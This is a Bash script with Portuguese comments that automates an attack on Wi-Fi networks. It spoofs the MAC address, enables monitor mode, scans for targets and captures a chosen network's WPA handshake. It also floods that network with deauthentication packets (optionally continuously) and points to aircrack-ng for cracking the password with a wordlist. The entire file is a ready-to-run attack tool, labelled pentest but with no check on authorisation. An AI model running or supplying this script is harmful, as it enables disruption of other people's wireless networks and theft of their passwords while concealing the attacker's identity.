#!/bin/bash

# Verifica se o dialog está instalado
if ! command -v dialog &> /dev/null; then
    echo "Instalando dialog..."
    sudo apt update && sudo apt install -y dialog
fi

# --- Função principal ---
wifi_pentest() {
    # Passo 1: Selecionar interface
    INTERFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v "lo" | dialog --stdout --menu "Selecione a interface:" 0 0 0)
    [ -z "$INTERFACE" ] && exit 1

    # Passo 2: Mudar MAC e ativar modo monitor
    dialog --infobox "Mudando MAC e ativando modo monitor..." 5 50
    sudo ifconfig $INTERFACE down
    sudo macchanger -r $INTERFACE &> /dev/null
    sudo ifconfig $INTERFACE up
    sudo airmon-ng check kill &> /dev/null
    sudo airmon-ng start $INTERFACE &> /dev/null
    INTERFACE_MON="${INTERFACE}mon"

    # Passo 3: Escolher rede alvo
    sudo airodump-ng $INTERFACE_MON &> /tmp/scan.txt &
    sleep 5
    kill $!
    BSSID=$(grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/scan.txt | dialog --stdout --menu "Selecione o BSSID alvo:" 0 0 0)
    CHANNEL=$(grep "$BSSID" -A 1 /tmp/scan.txt | awk -F' ' '{print $6}' | grep -oE '[0-9]+' | head -1)

    # Passo 4: Capturar handshake
    FILE_NAME=$(dialog --stdout --inputbox "Nome do arquivo de captura (sem extensão):" 0 0)
    dialog --infobox "Capturando handshake (Ctrl+C no terminal para parar)..." 5 70
    xterm -e "sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE_MON" &

    # Passo 5: Ataque de desautenticação
    PACKETS=$(dialog --stdout --inputbox "Número de pacotes de desautenticação (0 para contínuo):" 0 0)
    xterm -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE_MON" &

    # Resultado
    dialog --msgbox "Handshake capturado em:\n${FILE_NAME}.cap\n\nUse 'aircrack-ng -w wordlist.txt ${FILE_NAME}.cap' para quebrar." 10 50
}

# Executa a função principal
wifi_pentest

# Limpeza
sudo airmon-ng stop $INTERFACE_MON &> /dev/null
sudo ifconfig $INTERFACE down
sudo macchanger -p $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE up